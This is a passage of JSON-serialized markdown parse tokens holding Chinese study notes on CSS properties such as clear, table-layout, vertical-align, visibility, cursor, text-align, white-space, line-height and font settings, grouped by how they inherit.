none：允许两侧都有浮动元素\\n\\n","task":false,"loose":true,"text":"clear\\n控制元素周围浮动元素的行为，通常与 float 一起使用常见的值：\\n  left：禁止元素左侧有浮动元素\\n  right：禁止元素右侧有浮动元素\\n  both：禁止元素两侧有浮动元素\\n  none：允许两侧都有浮动元素\\n","tokens":[{"type":"text","raw":"clear\\n\\n控制元素周围浮动元素的行为，通常与 float 一起使用常见的值：\\n\\n  left：禁止元素左侧有浮动元素\\n\\n  right：禁止元素右侧有浮动元素\\n\\n  both：禁止元素两侧有浮动元素\\n\\n  none：允许两侧都有浮动元素\\n","text":"clear\\n控制元素周围浮动元素的行为，通常与 float 一起使用常见的值：\\n  left：禁止元素左侧有浮动元素\\n  right：禁止元素右侧有浮动元素\\n  both：禁止元素两侧有浮动元素\\n  none：允许两侧都有浮动元素","tokens":[{"type":"text","raw":"clear\\n控制元素周围浮动元素的行为，通常与 float 一起使用常见的值：\\n  left：禁止元素左侧有浮动元素\\n  right：禁止元素右侧有浮动元素\\n  both：禁止元素两侧有浮动元素\\n  none：允许两侧都有浮动元素","text":"clear\\n控制元素周围浮动元素的行为，通常与 float 一起使用常见的值：\\n  left：禁止元素左侧有浮动元素\\n  right：禁止元素右侧有浮动元素\\n  both：禁止元素两侧有浮动元素\\n  none：允许两侧都有浮动元素","escaped":false}]}]},{"type":"list_item","raw":"+ table-layout\\n  控制表格布局的算法常见的值：\\n    auto：浏览器根据内容调整列宽（默认）\\n    fixed：浏览器根据表格的宽度固定列宽\\n\\n","task":false,"loose":true,"text":"table-layout\\n控制表格布局的算法常见的值：\\n  auto：浏览器根据内容调整列宽（默认）\\n  fixed：浏览器根据表格的宽度固定列宽\\n","tokens":[{"type":"text","raw":"table-layout\\n\\n控制表格布局的算法常见的值：\\n\\n  auto：浏览器根据内容调整列宽（默认）\\n\\n  fixed：浏览器根据表格的宽度固定列宽\\n","text":"table-layout\\n控制表格布局的算法常见的值：\\n  auto：浏览器根据内容调整列宽（默认）\\n  fixed：浏览器根据表格的宽度固定列宽","tokens":[{"type":"text","raw":"table-layout\\n控制表格布局的算法常见的值：\\n  auto：浏览器根据内容调整列宽（默认）\\n  fixed：浏览器根据表格的宽度固定列宽","text":"table-layout\\n控制表格布局的算法常见的值：\\n  auto：浏览器根据内容调整列宽（默认）\\n  fixed：浏览器根据表格的宽度固定列宽","escaped":false}]}]},{"type":"list_item","raw":"+ vertical-align\\n  控制元素在垂直方向上的对齐方式常见的值：\\n    top：元素顶部对齐\\n    middle：元素垂直居中对齐\\n    bottom：元素底部对齐\\n\\n","task":false,"loose":true,"text":"vertical-align\\n控制元素在垂直方向上的对齐方式常见的值：\\n  top：元素顶部对齐\\n  middle：元素垂直居中对齐\\n  bottom：元素底部对齐\\n","tokens":[{"type":"text","raw":"vertical-align\\n\\n控制元素在垂直方向上的对齐方式常见的值：\\n\\n  top：元素顶部对齐\\n\\n  middle：元素垂直居中对齐\\n\\n  bottom：元素底部对齐\\n","text":"vertical-align\\n控制元素在垂直方向上的对齐方式常见的值：\\n  top：元素顶部对齐\\n  middle：元素垂直居中对齐\\n  bottom：元素底部对齐","tokens":[{"type":"text","raw":"vertical-align\\n控制元素在垂直方向上的对齐方式常见的值：\\n  top：元素顶部对齐\\n  middle：元素垂直居中对齐\\n  bottom：元素底部对齐","text":"vertical-align\\n控制元素在垂直方向上的对齐方式常见的值：\\n  top：元素顶部对齐\\n  middle：元素垂直居中对齐\\n  bottom：元素底部对齐","escaped":false}]}]},{"type":"list_item","raw":"+ page-break-after\\n  控制分页符的位置常见的值：\\n    auto：默认，自动决定分页\\n    always：强制分页\\n    avoid：避免分页\\n\\n","task":false,"loose":true,"text":"page-break-after\\n控制分页符的位置常见的值：\\n  auto：默认，自动决定分页\\n  always：强制分页\\n  avoid：避免分页\\n","tokens":[{"type":"text","raw":"page-break-after\\n\\n控制分页符的位置常见的值：\\n\\n  auto：默认，自动决定分页\\n\\n  always：强制分页\\n\\n  avoid：避免分页\\n","text":"page-break-after\\n控制分页符的位置常见的值：\\n  auto：默认，自动决定分页\\n  always：强制分页\\n  avoid：避免分页","tokens":[{"type":"text","raw":"page-break-after\\n控制分页符的位置常见的值：\\n  auto：默认，自动决定分页\\n  always：强制分页\\n  avoid：避免分页","text":"page-break-after\\n控制分页符的位置常见的值：\\n  auto：默认，自动决定分页\\n  always：强制分页\\n  avoid：避免分页","escaped":false}]}]},{"type":"list_item","raw":"+ page-break-before\\n  与 page-break-after 类似，控制元素前面的分页符\\n\\n","task":false,"loose":true,"text":"page-break-before\\n与 page-break-after 类似，控制元素前面的分页符\\n","tokens":[{"type":"text","raw":"page-break-before\\n\\n与 page-break-after 类似，控制元素前面的分页符\\n","text":"page-break-before\\n与 page-break-after 类似，控制元素前面的分页符","tokens":[{"type":"text","raw":"page-break-before\\n与 page-break-after 类似，控制元素前面的分页符","text":"page-break-before\\n与 page-break-after 类似，控制元素前面的分页符","escaped":false}]}]},{"type":"list_item","raw":"+ unicode-bidi\\n  控制文本的双向性，通常与 direction 属性一起使用，用于处理多语言文本的显示常见的值：\\n    normal：正常的双向文本布局\\n    embed：强制嵌入的文本遵循本地的方向性\\n    bidi-override：覆盖文本的方向性，强制使用 direction 属性的值","task":false,"loose":true,"text":"unicode-bidi\\n控制文本的双向性，通常与 direction 属性一起使用，用于处理多语言文本的显示常见的值：\\n  normal：正常的双向文本布局\\n  embed：强制嵌入的文本遵循本地的方向性\\n  bidi-override：覆盖文本的方向性，强制使用 direction 属性的值","tokens":[{"type":"text","raw":"unicode-bidi\\n\\n控制文本的双向性，通常与 direction 属性一起使用，用于处理多语言文本的显示常见的值：\\n\\n  normal：正常的双向文本布局\\n\\n  embed：强制嵌入的文本遵循本地的方向性\\n\\n  bidi-override：覆盖文本的方向性，强制使用 direction 属性的值","text":"unicode-bidi\\n控制文本的双向性，通常与 direction 属性一起使用，用于处理多语言文本的显示常见的值：\\n  normal：正常的双向文本布局\\n  embed：强制嵌入的文本遵循本地的方向性\\n  bidi-override：覆盖文本的方向性，强制使用 direction 属性的值","tokens":[{"type":"text","raw":"unicode-bidi\\n控制文本的双向性，通常与 direction 属性一起使用，用于处理多语言文本的显示常见的值：\\n  normal：正常的双向文本布局\\n  embed：强制嵌入的文本遵循本地的方向性\\n  bidi-override：覆盖文本的方向性，强制使用 direction 属性的值","text":"unicode-bidi\\n控制文本的双向性，通常与 direction 属性一起使用，用于处理多语言文本的显示常见的值：\\n  normal：正常的双向文本布局\\n  embed：强制嵌入的文本遵循本地的方向性\\n  bidi-override：覆盖文本的方向性，强制使用 direction 属性的值","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 所有元素可继承的\\n\\n  + visibility\\n    visibility 属性控制元素的可见性，与 display: none 不同，使用 visibility: hidden 隐藏元素时，元素依然占据空间，但不可见；\\n    常见值包括：\\n      visible（默认值）：元素是可见的\\n      hidden：元素不可见，但仍然占据空间\\n      collapse：用于表格元素时，隐藏元素并且不占据空间（与 hidden 类似，但通常用于 `<tr>、<th>、<td>` 等表格元素）\\n\\n  + cursor\\n    cursor 属性控制鼠标指针在元素上的样式，通常用于改变鼠标悬停在某个元素上时的外观；\\n    常见值包括：\\n      auto：默认指针，浏览器根据上下文决定指针样式\\n      pointer：显示手形指针，通常用于可点击的链接或按钮\\n      default：默认的光标样式\\n      none：隐藏鼠标指针\\n      wait：显示一个旋转的沙漏或类似的等待指针，表示操作正在进行\\n      move：显示一个四向箭头，表示可以移动元素\\n      text：显示文本光标，通常用于文本输入区域\\n      not-allowed：显示禁用的指针，通常表示该操作不可用\\n      help：显示问号光标，通常表示需要帮助的地方\\n\\n","task":false,"loose":true,"text":"**1：** 所有元素可继承的\\n\\n+ visibility\\n  visibility 属性控制元素的可见性，与 display: none 不同，使用 visibility: hidden 隐藏元素时，元素依然占据空间，但不可见；\\n  常见值包括：\\n    visible（默认值）：元素是可见的\\n    hidden：元素不可见，但仍然占据空间\\n    collapse：用于表格元素时，隐藏元素并且不占据空间（与 hidden 类似，但通常用于 `<tr>、<th>、<td>` 等表格元素）\\n\\n+ cursor\\n  cursor 属性控制鼠标指针在元素上的样式，通常用于改变鼠标悬停在某个元素上时的外观；\\n  常见值包括：\\n    auto：默认指针，浏览器根据上下文决定指针样式\\n    pointer：显示手形指针，通常用于可点击的链接或按钮\\n    default：默认的光标样式\\n    none：隐藏鼠标指针\\n    wait：显示一个旋转的沙漏或类似的等待指针，表示操作正在进行\\n    move：显示一个四向箭头，表示可以移动元素\\n    text：显示文本光标，通常用于文本输入区域\\n    not-allowed：显示禁用的指针，通常表示该操作不可用\\n    help：显示问号光标，通常表示需要帮助的地方\\n","tokens":[{"type":"text","raw":"**1：** 所有元素可继承的","text":"**1：** 所有元素可继承的","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 所有元素可继承的","text":" 所有元素可继承的","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"+ visibility\\n  visibility 属性控制元素的可见性，与 display: none 不同，使用 visibility: hidden 隐藏元素时，元素依然占据空间，但不可见；\\n  常见值包括：\\n    visible（默认值）：元素是可见的\\n    hidden：元素不可见，但仍然占据空间\\n    collapse：用于表格元素时，隐藏元素并且不占据空间（与 hidden 类似，但通常用于 `<tr>、<th>、<td>` 等表格元素）\\n\\n+ cursor\\n  cursor 属性控制鼠标指针在元素上的样式，通常用于改变鼠标悬停在某个元素上时的外观；\\n  常见值包括：\\n    auto：默认指针，浏览器根据上下文决定指针样式\\n    pointer：显示手形指针，通常用于可点击的链接或按钮\\n    default：默认的光标样式\\n    none：隐藏鼠标指针\\n    wait：显示一个旋转的沙漏或类似的等待指针，表示操作正在进行\\n    move：显示一个四向箭头，表示可以移动元素\\n    text：显示文本光标，通常用于文本输入区域\\n    not-allowed：显示禁用的指针，通常表示该操作不可用\\n    help：显示问号光标，通常表示需要帮助的地方\\n","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"+ visibility\\n  visibility 属性控制元素的可见性，与 display: none 不同，使用 visibility: hidden 隐藏元素时，元素依然占据空间，但不可见；\\n  常见值包括：\\n    visible（默认值）：元素是可见的\\n    hidden：元素不可见，但仍然占据空间\\n    collapse：用于表格元素时，隐藏元素并且不占据空间（与 hidden 类似，但通常用于 `<tr>、<th>、<td>` 等表格元素）\\n\\n","task":false,"loose":true,"text":"visibility\\nvisibility 属性控制元素的可见性，与 display: none 不同，使用 visibility: hidden 隐藏元素时，元素依然占据空间，但不可见；\\n常见值包括：\\n  visible（默认值）：元素是可见的\\n  hidden：元素不可见，但仍然占据空间\\n  collapse：用于表格元素时，隐藏元素并且不占据空间（与 hidden 类似，但通常用于 `<tr>、<th>、<td>` 等表格元素）\\n","tokens":[{"type":"text","raw":"visibility\\n\\nvisibility 属性控制元素的可见性，与 display: none 不同，使用 visibility: hidden 隐藏元素时，元素依然占据空间，但不可见；\\n\\n常见值包括：\\n\\n  visible（默认值）：元素是可见的\\n\\n  hidden：元素不可见，但仍然占据空间\\n\\n  collapse：用于表格元素时，隐藏元素并且不占据空间（与 hidden 类似，但通常用于 `<tr>、<th>、<td>` 等表格元素）\\n","text":"visibility\\nvisibility 属性控制元素的可见性，与 display: none 不同，使用 visibility: hidden 隐藏元素时，元素依然占据空间，但不可见；\\n常见值包括：\\n  visible（默认值）：元素是可见的\\n  hidden：元素不可见，但仍然占据空间\\n  collapse：用于表格元素时，隐藏元素并且不占据空间（与 hidden 类似，但通常用于 `<tr>、<th>、<td>` 等表格元素）","tokens":[{"type":"text","raw":"visibility\\nvisibility 属性控制元素的可见性，与 display: none 不同，使用 visibility: hidden 隐藏元素时，元素依然占据空间，但不可见；\\n常见值包括：\\n  visible（默认值）：元素是可见的\\n  hidden：元素不可见，但仍然占据空间\\n  collapse：用于表格元素时，隐藏元素并且不占据空间（与 hidden 类似，但通常用于 ","text":"visibility\\nvisibility 属性控制元素的可见性，与 display: none 不同，使用 visibility: hidden 隐藏元素时，元素依然占据空间，但不可见；\\n常见值包括：\\n  visible（默认值）：元素是可见的\\n  hidden：元素不可见，但仍然占据空间\\n  collapse：用于表格元素时，隐藏元素并且不占据空间（与 hidden 类似，但通常用于 ","escaped":false},{"type":"codespan","raw":"`<tr>、<th>、<td>`","text":"<tr>、<th>、<td>"},{"type":"text","raw":" 等表格元素）","text":" 等表格元素）","escaped":false}]}]},{"type":"list_item","raw":"+ cursor\\n  cursor 属性控制鼠标指针在元素上的样式，通常用于改变鼠标悬停在某个元素上时的外观；\\n  常见值包括：\\n    auto：默认指针，浏览器根据上下文决定指针样式\\n    pointer：显示手形指针，通常用于可点击的链接或按钮\\n    default：默认的光标样式\\n    none：隐藏鼠标指针\\n    wait：显示一个旋转的沙漏或类似的等待指针，表示操作正在进行\\n    move：显示一个四向箭头，表示可以移动元素\\n    text：显示文本光标，通常用于文本输入区域\\n    not-allowed：显示禁用的指针，通常表示该操作不可用\\n    help：显示问号光标，通常表示需要帮助的地方","task":false,"loose":true,"text":"cursor\\ncursor 属性控制鼠标指针在元素上的样式，通常用于改变鼠标悬停在某个元素上时的外观；\\n常见值包括：\\n  auto：默认指针，浏览器根据上下文决定指针样式\\n  pointer：显示手形指针，通常用于可点击的链接或按钮\\n  default：默认的光标样式\\n  none：隐藏鼠标指针\\n  wait：显示一个旋转的沙漏或类似的等待指针，表示操作正在进行\\n  move：显示一个四向箭头，表示可以移动元素\\n  text：显示文本光标，通常用于文本输入区域\\n  not-allowed：显示禁用的指针，通常表示该操作不可用\\n  help：显示问号光标，通常表示需要帮助的地方","tokens":[{"type":"text","raw":"cursor\\n\\ncursor 属性控制鼠标指针在元素上的样式，通常用于改变鼠标悬停在某个元素上时的外观；\\n\\n常见值包括：\\n\\n  auto：默认指针，浏览器根据上下文决定指针样式\\n\\n  pointer：显示手形指针，通常用于可点击的链接或按钮\\n\\n  default：默认的光标样式\\n\\n  none：隐藏鼠标指针\\n\\n  wait：显示一个旋转的沙漏或类似的等待指针，表示操作正在进行\\n\\n  move：显示一个四向箭头，表示可以移动元素\\n\\n  text：显示文本光标，通常用于文本输入区域\\n\\n  not-allowed：显示禁用的指针，通常表示该操作不可用\\n\\n  help：显示问号光标，通常表示需要帮助的地方","text":"cursor\\ncursor 属性控制鼠标指针在元素上的样式，通常用于改变鼠标悬停在某个元素上时的外观；\\n常见值包括：\\n  auto：默认指针，浏览器根据上下文决定指针样式\\n  pointer：显示手形指针，通常用于可点击的链接或按钮\\n  default：默认的光标样式\\n  none：隐藏鼠标指针\\n  wait：显示一个旋转的沙漏或类似的等待指针，表示操作正在进行\\n  move：显示一个四向箭头，表示可以移动元素\\n  text：显示文本光标，通常用于文本输入区域\\n  not-allowed：显示禁用的指针，通常表示该操作不可用\\n  help：显示问号光标，通常表示需要帮助的地方","tokens":[{"type":"text","raw":"cursor\\ncursor 属性控制鼠标指针在元素上的样式，通常用于改变鼠标悬停在某个元素上时的外观；\\n常见值包括：\\n  auto：默认指针，浏览器根据上下文决定指针样式\\n  pointer：显示手形指针，通常用于可点击的链接或按钮\\n  default：默认的光标样式\\n  none：隐藏鼠标指针\\n  wait：显示一个旋转的沙漏或类似的等待指针，表示操作正在进行\\n  move：显示一个四向箭头，表示可以移动元素\\n  text：显示文本光标，通常用于文本输入区域\\n  not-allowed：显示禁用的指针，通常表示该操作不可用\\n  help：显示问号光标，通常表示需要帮助的地方","text":"cursor\\ncursor 属性控制鼠标指针在元素上的样式，通常用于改变鼠标悬停在某个元素上时的外观；\\n常见值包括：\\n  auto：默认指针，浏览器根据上下文决定指针样式\\n  pointer：显示手形指针，通常用于可点击的链接或按钮\\n  default：默认的光标样式\\n  none：隐藏鼠标指针\\n  wait：显示一个旋转的沙漏或类似的等待指针，表示操作正在进行\\n  move：显示一个四向箭头，表示可以移动元素\\n  text：显示文本光标，通常用于文本输入区域\\n  not-allowed：显示禁用的指针，通常表示该操作不可用\\n  help：显示问号光标，通常表示需要帮助的地方","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 终极块级元素可继承的\\n\\n  + text-indent\\n    text-indent 用于控制文本的首行缩进；这个属性通常应用于块级元素，如 `<p>、<div>` 等，控制块内文本的缩进量；常见值：\\n      length：指定缩进的距离，例如 20px 或 2em\\n      %：表示缩进的百分比，基于元素的宽度\\n      initial：将属性恢复为默认值\\n\\n  + text-align\\n    text-align 用于设置块级元素内文本的对齐方式，可以控制文本或内联元素在其父容器中的水平对齐，常见值：\\n      left：将文本对齐到左边\\n      right：将文本对齐到右边\\n      center：将文本居中\\n      justify：将文本两端对齐，通常用于段落，使得文本两端都紧贴容器\\n      start 和 end：依据书写方向（左到右或右到左）自动决定对齐方式\\n\\n","task":false,"loose":true,"text":"**1：** 终极块级元素可继承的\\n\\n+ text-indent\\n  text-indent 用于控制文本的首行缩进；这个属性通常应用于块级元素，如 `<p>、<div>` 等，控制块内文本的缩进量；常见值：\\n    length：指定缩进的距离，例如 20px 或 2em\\n    %：表示缩进的百分比，基于元素的宽度\\n    initial：将属性恢复为默认值\\n\\n+ text-align\\n  text-align 用于设置块级元素内文本的对齐方式，可以控制文本或内联元素在其父容器中的水平对齐，常见值：\\n    left：将文本对齐到左边\\n    right：将文本对齐到右边\\n    center：将文本居中\\n    justify：将文本两端对齐，通常用于段落，使得文本两端都紧贴容器\\n    start 和 end：依据书写方向（左到右或右到左）自动决定对齐方式\\n","tokens":[{"type":"text","raw":"**1：** 终极块级元素可继承的","text":"**1：** 终极块级元素可继承的","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 终极块级元素可继承的","text":" 终极块级元素可继承的","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"+ text-indent\\n  text-indent 用于控制文本的首行缩进；这个属性通常应用于块级元素，如 `<p>、<div>` 等，控制块内文本的缩进量；常见值：\\n    length：指定缩进的距离，例如 20px 或 2em\\n    %：表示缩进的百分比，基于元素的宽度\\n    initial：将属性恢复为默认值\\n\\n+ text-align\\n  text-align 用于设置块级元素内文本的对齐方式，可以控制文本或内联元素在其父容器中的水平对齐，常见值：\\n    left：将文本对齐到左边\\n    right：将文本对齐到右边\\n    center：将文本居中\\n    justify：将文本两端对齐，通常用于段落，使得文本两端都紧贴容器\\n    start 和 end：依据书写方向（左到右或右到左）自动决定对齐方式\\n","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"+ text-indent\\n  text-indent 用于控制文本的首行缩进；这个属性通常应用于块级元素，如 `<p>、<div>` 等，控制块内文本的缩进量；常见值：\\n    length：指定缩进的距离，例如 20px 或 2em\\n    %：表示缩进的百分比，基于元素的宽度\\n    initial：将属性恢复为默认值\\n\\n","task":false,"loose":true,"text":"text-indent\\ntext-indent 用于控制文本的首行缩进；这个属性通常应用于块级元素，如 `<p>、<div>` 等，控制块内文本的缩进量；常见值：\\n  length：指定缩进的距离，例如 20px 或 2em\\n  %：表示缩进的百分比，基于元素的宽度\\n  initial：将属性恢复为默认值\\n","tokens":[{"type":"text","raw":"text-indent\\n\\ntext-indent 用于控制文本的首行缩进；这个属性通常应用于块级元素，如 `<p>、<div>` 等，控制块内文本的缩进量；常见值：\\n\\n  length：指定缩进的距离，例如 20px 或 2em\\n\\n  %：表示缩进的百分比，基于元素的宽度\\n\\n  initial：将属性恢复为默认值\\n","text":"text-indent\\ntext-indent 用于控制文本的首行缩进；这个属性通常应用于块级元素，如 `<p>、<div>` 等，控制块内文本的缩进量；常见值：\\n  length：指定缩进的距离，例如 20px 或 2em\\n  %：表示缩进的百分比，基于元素的宽度\\n  initial：将属性恢复为默认值","tokens":[{"type":"text","raw":"text-indent\\ntext-indent 用于控制文本的首行缩进；这个属性通常应用于块级元素，如 ","text":"text-indent\\ntext-indent 用于控制文本的首行缩进；这个属性通常应用于块级元素，如 ","escaped":false},{"type":"codespan","raw":"`<p>、<div>`","text":"<p>、<div>"},{"type":"text","raw":" 等，控制块内文本的缩进量；常见值：\\n  length：指定缩进的距离，例如 20px 或 2em\\n  %：表示缩进的百分比，基于元素的宽度\\n  initial：将属性恢复为默认值","text":" 等，控制块内文本的缩进量；常见值：\\n  length：指定缩进的距离，例如 20px 或 2em\\n  %：表示缩进的百分比，基于元素的宽度\\n  initial：将属性恢复为默认值","escaped":false}]}]},{"type":"list_item","raw":"+ text-align\\n  text-align 用于设置块级元素内文本的对齐方式，可以控制文本或内联元素在其父容器中的水平对齐，常见值：\\n    left：将文本对齐到左边\\n    right：将文本对齐到右边\\n    center：将文本居中\\n    justify：将文本两端对齐，通常用于段落，使得文本两端都紧贴容器\\n    start 和 end：依据书写方向（左到右或右到左）自动决定对齐方式","task":false,"loose":true,"text":"text-align\\ntext-align 用于设置块级元素内文本的对齐方式，可以控制文本或内联元素在其父容器中的水平对齐，常见值：\\n  left：将文本对齐到左边\\n  right：将文本对齐到右边\\n  center：将文本居中\\n  justify：将文本两端对齐，通常用于段落，使得文本两端都紧贴容器\\n  start 和 end：依据书写方向（左到右或右到左）自动决定对齐方式","tokens":[{"type":"text","raw":"text-align\\n\\ntext-align 用于设置块级元素内文本的对齐方式，可以控制文本或内联元素在其父容器中的水平对齐，常见值：\\n\\n  left：将文本对齐到左边\\n\\n  right：将文本对齐到右边\\n\\n  center：将文本居中\\n\\n  justify：将文本两端对齐，通常用于段落，使得文本两端都紧贴容器\\n\\n  start 和 end：依据书写方向（左到右或右到左）自动决定对齐方式","text":"text-align\\ntext-align 用于设置块级元素内文本的对齐方式，可以控制文本或内联元素在其父容器中的水平对齐，常见值：\\n  left：将文本对齐到左边\\n  right：将文本对齐到右边\\n  center：将文本居中\\n  justify：将文本两端对齐，通常用于段落，使得文本两端都紧贴容器\\n  start 和 end：依据书写方向（左到右或右到左）自动决定对齐方式","tokens":[{"type":"text","raw":"text-align\\ntext-align 用于设置块级元素内文本的对齐方式，可以控制文本或内联元素在其父容器中的水平对齐，常见值：\\n  left：将文本对齐到左边\\n  right：将文本对齐到右边\\n  center：将文本居中\\n  justify：将文本两端对齐，通常用于段落，使得文本两端都紧贴容器\\n  start 和 end：依据书写方向（左到右或右到左）自动决定对齐方式","text":"text-align\\ntext-align 用于设置块级元素内文本的对齐方式，可以控制文本或内联元素在其父容器中的水平对齐，常见值：\\n  left：将文本对齐到左边\\n  right：将文本对齐到右边\\n  center：将文本居中\\n  justify：将文本两端对齐，通常用于段落，使得文本两端都紧贴容器\\n  start 和 end：依据书写方向（左到右或右到左）自动决定对齐方式","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 内联元素可继承的\\n  + letter-spacing\\n    letter-spacing 用于设置文本中字符之间的间距。它控制字母之间的距离，可以让文本看起来更加紧凑或更加宽松，常见值：\\n      normal：默认的字符间距，通常为 0\\n      length：指定字符间的间距，可以使用单位如 px、em、rem 等。例如，2px 或 0.1em\\n\\n  + word-spacing\\n    word-spacing 用于设置单词之间的间距。它控制单词之间的空白区域，可以增加或减少单词间的空隙。\\n    常见值：\\n      normal：默认的单词间距。\\n      length：指定单词间距，可以使用 px、em、rem 等单位。\\n\\n  + white-space\\n    white-space 用于控制元素内文本的空白字符处理方式。它决定了文本中的空格、换行等如何展示；常见值：\\n      normal：默认值，连续空白字符会合并为一个空格，文本会自动换行\\n      nowrap：文本不会换行，所有空白字符会被合并为一个空格\\n      pre：保留空格和换行符，类似于 `<pre>` 标签的效果\\n      pre-wrap：保留空格和换行符，文本会自动换行\\n      pre-line：合并多个空白字符，但保留换行符\\n\\n  + line-height\\n    line-height 用于设置文本行与行之间的垂直间距。它控制行之间的间隔，通常用于改善文本的可读性；常见值：\\n      normal：默认的行高，通常为字体大小的 1.2 倍。\\n      number：指定行高为字体大小的倍数。\\n      length：指定固定的行高值，如 20px、1.5em。\\n      percentage：指定行高为字体大小的百分比。\\n\\n  + color\\n    color 用于设置文本的颜色，常见值：\\n      color：任何有效的颜色值，例如 red、#ff0000、rgb(255, 0, 0)、rgba(255, 0, 0, 0.5)。\\n\\n  + font\\n\\n    font 是一个简写属性，用于设置字体相关的多个属性。它可以同时设置字体系列、字体样式、字体粗细、字体大小等；常见值：\\n      font-style、font-variant、font-weight、font-size、line-height、font-family\\n  + font-size\\n    font-size 用于设置文本的大小；常见值：\\n      length：如 12px、1em、0.75rem。\\n      percentage：相对于父元素的字体大小，如 150%。\\n      medium：默认字体大小。\\n      larger / smaller：相对于父元素字体大小的大小调整。\\n\\n  + font-style\\n    font-style 用于设置文本的样式，通常用于斜体文本；常见值：\\n      normal：正常样式\\n      italic：斜体\\n      oblique：倾斜字体，通常与 italic 类似，但不是正式的斜体字形\\n\\n  + font-variant\\n    font-variant 用于控制文本是否使用变体字体；常见值：\\n      normal：正常字体。\\n      small-caps：小型大写字母，通常用于显示大写字母，但它们比普通大写字母小。\\n\\n  + font-weight\\n    font-weight 用于设置文本的粗细；常见值：\\n      normal：正常的字体粗细\\n      bold：加粗字体\\n      bolder：比父元素更粗\\n      lighter：比父元素更细\\n      number：可以指定 100 到 900 之间的数值，例如 400 是正常粗细，700 是加粗\\n\\n  + text-decoration\\n    text-decoration 用于设置文本的装饰效果，如下划线、删除线等；常见值：\\n      none：无装饰\\n      underline：下划线\\n      overline：上划线\\n      line-through：删除线\\n      blink：闪烁的文本（大多数浏览器已不支持）\\n\\n  + text-transform\\n    text-transform 用于控制文本的大小写转换；常见值：\\n      none：不转换大小写\\n      capitalize：将每个单词的首字母转换为大写\\n      uppercase：将所有字母转换为大写\\n      lowercase：将所有字母转换为小写\\n\\n  + direction\\n    direction 用于设置文本的书写方向；常见值：\\n      ltr：从左到右（默认）\\n      rtl：从右到左，通常用于阿拉伯语、希伯来语等语言\\n\\n","task":false,"loose":true,"text":"**1：** 内联元素可继承的\\n+ letter-spacing\\n  letter-spacing 用于设置文本中字符之间的间距。它控制字母之间的距离，可以让文本看起来更加紧凑或更加宽松，常见值：\\n    normal：默认的字符间距，通常为 0\\n    length：指定字符间的间距，可以使用单位如 px、em、rem 等。例如，2px 或 0.1em\\n\\n+ word-spacing\\n  word-spacing 用于设置单词之间的间距。它控制单词之间的空白区域，可以增加或减少单词间的空隙。\\n  常见值：\\n    normal：默认的单词间距。\\n    length：指定单词间距，可以使用 px、em、rem 等单位。\\n\\n+ white-space\\n  white-space 用于控制元素内文本的空白字符处理方式。它决定了文本中的空格、换行等如何展示；常见值：\\n    normal：默认值，连续空白字符会合并为一个空格，文本会自动换行\\n    nowrap：文本不会换行，所有空白字符会被合并为一个空格\\n    pre：保留空格和换行符，类似于 `<pre>` 标签的效果\\n    pre-wrap：保留空格和换行符，文本会自动换行\\n    pre-line：合并多个空白字符，但保留换行符\\n\\n+ line-height\\n  line-height 用于设置文本行与行之间的垂直间距。它控制行之间的间隔，通常用于改善文本的可读性；常见值：\\n    normal：默认的行高，通常为字体大小的 1.2 倍。\\n    number：指定行高为字体大小的倍数。\\n    length：指定固定的行高值，如 20px、1.5em。\\n    percentage：指定行高为字体大小的百分比。\\n\\n+ color\\n  color 用于设置文本的颜色，常见值：\\n    color：任何有效的颜色值，例如 red、#ff0000、rgb(255, 0, 0)、rgba(255, 0, 0, 0.5)。\\n\\n+ font\\n\\n  font 是一个简写属性，用于设置字体相关的多个属性。它可以同时设置字体系列、字体样式、字体粗细、字体大小等；常见值：\\n    font-style、font-variant、font-weight、font-size、line-height、font-family\\n+ font-size\\n  font-size 用于设置文本的大小；常见值：\\n    length：如 12px、1em、0.75rem。\\n    percentage：相对于父元素的字体大小，如 150%。\\n    medium：默认字体大小。\\n    larger / smaller：相对于父元素字体大小的大小调整。\\n\\n+ font-style\\n  font-style 用于设置文本的样式，通常用于斜体文本；常见值：\\n    normal：正常样式\\n    italic：斜体\\n    oblique：倾斜字体，通常与 italic 类似，但不是正式的斜体字形\\n\\n+ font-variant\\n  font-variant 用于控制文本是否使用变体字体；常见值：\\n    normal：正常字体。\\n    small-caps：小型大写字母，通常用于显示大写字母，但它们比普通大写字母小。\\n\\n+ font-weight\\n  font-weight 用于设置文本的粗细；常见值：\\n    normal：正常的字体粗细\\n    bold：加粗字体\\n    bolder：比父元素更粗\\n    lighter：比父元素更细\\n    number：可以指定 100 到 900 之间的数值，例如 400 是正常粗细，700 是加粗\\n\\n+ text-decoration\\n  text-decoration 用于设置文本的装饰效果，如下划线、删除线等；常见值：\\n    none：无装饰\\n    underline：下划线\\n    overline：上划线\\n    line-through：删除线\\n    blink：闪烁的文本（大多数浏览器已不支持）\\n\\n+ text-transform\\n  text-transform 用于控制文本的大小写转换；常见值：\\n    none：不转换大小写\\n    capitalize：将每个单词的首字母转换为大写\\n    uppercase：将所有字母转换为大写\\n    lowercase：将所有字母转换为小写\\n\\n+ direction\\n  direction 用于设置文本的书写方向；常见值：\\n    ltr：从左到右（默认）\\n    rtl：从右到左，通常用于阿拉伯语、希伯来语等语言\\n","tokens":[{"type":"text","raw":"**1：** 内联元素可继承的\\n","text":"**1：** 内联元素可继承的","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 内联元素可继承的","text":" 内联元素可继承的","escaped":false}]},{"type":"list","raw":"+ letter-spacing\\n  letter-spacing 用于设置文本中字符之间的间距。它控制字母之间的距离，可以让文本看起来更加紧凑或更加宽松，常见值：\\n    normal：默认的字符间距，通常为 0\\n    length：指定字符间的间距，可以使用单位如 px、em、rem 等。例如，2px 或 0.1em\\n\\n+ word-spacing\\n  word-spacing 用于设置单词之间的间距。它控制单词之间的空白区域，可以增加或减少单词间的空隙。\\n  常见值：\\n    normal：默认的单词间距。\\n    length：指定单词间距，可以使用 